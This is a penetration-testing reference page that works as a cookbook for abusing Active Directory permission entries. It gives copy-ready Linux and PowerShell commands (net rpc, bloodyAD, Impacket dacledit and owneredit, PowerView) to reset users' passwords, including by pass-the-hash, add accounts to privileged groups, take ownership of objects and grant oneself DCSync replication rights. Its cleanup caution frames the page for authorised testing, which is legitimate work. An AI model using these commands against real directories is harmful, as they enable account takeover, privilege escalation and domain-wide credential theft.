**DACL abuse primitives** — an ACE is one entry in an Active Directory object's permission list, saying who may do what to it; this page is the cookbook for turning each dangerous ACE you hold into something usable — a known password, membership in a privileged group, or the replication rights behind DCSync. You pick the recipe that matches the edge you already confirmed (see [_Intro to ACL Attacks](_Intro%20to%20ACL%20Attacks.md)) and run it. One method per edge, Linux and Windows.

## Discovery

Confirm the right you hold over the target - see the Discovery section of [_Intro to ACL Attacks](_Intro%20to%20ACL%20Attacks.md).

## Exploitation

### ForceChangePassword / GenericAll → reset a user's password

Resets the password without knowing the old one. **Warning:** disruptive - the real user loses access; prefer [Shadow Credentials](Shadow%20Credentials%20Attack%20Guide.md) or [Targeted Kerberoasting](Targeted%20Kerberoasting.md) when you only need the account's access, not its password.

```bash

net rpc password 'TARGET_USER' -U 'DOMAIN'/'USER_NAME'%'USER_PASS' -S 'DC_HOST'
# pass-the-hash
pth-net rpc password 'TARGET_USER' -U 'DOMAIN'/'USER_NAME'%'ffffffffffffffffffffffffffffffff':'USER_NT_HASH' -S 'DC_HOST'
# bloodyAD
bloodyAD --host 'DC_IP' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' set password 'TARGET_USER' 'NEW_PASS'

```

```powershell

# Windows (PowerView)
Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword (ConvertTo-SecureString 'NEW_PASS' -AsPlainText -Force)

```

### AddMember / AddSelf → add to a group

```bash

net rpc group addmem 'TARGET_GROUP' 'TARGET_USER' -U 'DOMAIN'/'USER_NAME'%'USER_PASS' -S 'DC_HOST'
bloodyAD --host 'DC_IP' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' add groupMember 'TARGET_GROUP' 'TARGET_USER'

```

```powershell

# Windows (PowerView) - also works across an intra-forest trust (CHILD\user into a parent group)
Add-DomainGroupMember -Identity 'TARGET_GROUP' -Members 'TARGET_USER' -Domain 'DOMAIN'

```

### WriteDacl / GenericAll → grant rights (incl. self-grant DCSync)

```bash

dacledit.py -action write -rights FullControl -principal 'USER_NAME' -target 'TARGET' 'DOMAIN/USER_NAME:USER_PASS'
# grant yourself replication rights, then DCSync
dacledit.py -action write -rights DCSync -principal 'USER_NAME' -target-dn 'DC=DOMAIN,DC=LOCAL' 'DOMAIN/USER_NAME:USER_PASS'
bloodyAD --host 'DC_IP' -d 'DOMAIN' -u 'USER_NAME' -p 'USER_PASS' add dcsync 'USER_NAME'

```

```powershell

# Windows (PowerView)
Add-DomainObjectAcl -TargetIdentity 'TARGET' -PrincipalIdentity 'USER_NAME' -Rights All
Add-DomainObjectAcl -TargetIdentity 'DOMAIN' -PrincipalIdentity 'USER_NAME' -Rights DCSync

```

Then replicate - see [DCSync](../Credential%20Dumping/DCSync.md).

### WriteOwner → take ownership, then WriteDacl

```bash

owneredit.py -action write -new-owner 'USER_NAME' -target 'TARGET' 'DOMAIN/USER_NAME:USER_PASS'
# now you own it → apply the WriteDacl step above

```

```powershell

# Windows (PowerView)
Set-DomainObjectOwner -Identity 'TARGET' -OwnerIdentity 'USER_NAME'

```

### GenericWrite → also enables

- [Shadow Credentials](Shadow%20Credentials%20Attack%20Guide.md) (write `msDS-KeyCredentialLink`) - preferred over a password reset.
- [Targeted Kerberoasting](Targeted%20Kerberoasting.md) (write a temporary SPN).
- [RBCD](../Delegation%20Attacks/RBCD%20Attack.md) (write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer).

## Caution

Anything that writes to AD must be reverted: remove ACEs/owners you added (`dacledit.py -action remove`, `owneredit.py`), remove group members you added, and note reset passwords in the report (they cannot be un-reset). Cross-link: an ACE on a protected group is cleaned by SDProp - see [AdminSDHolder](../Persistence/AdminSDHolder.md).

## References

- The Hacker Recipes - ForceChangePassword - https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
- The Hacker Recipes - Grant rights - https://www.thehacker.recipes/ad/movement/dacl/grant-rights
- bloodyAD - https://github.com/CravateRouge/bloodyAD
- Impacket (dacledit.py / owneredit.py) - https://github.com/fortra/impacket/tree/master/examples
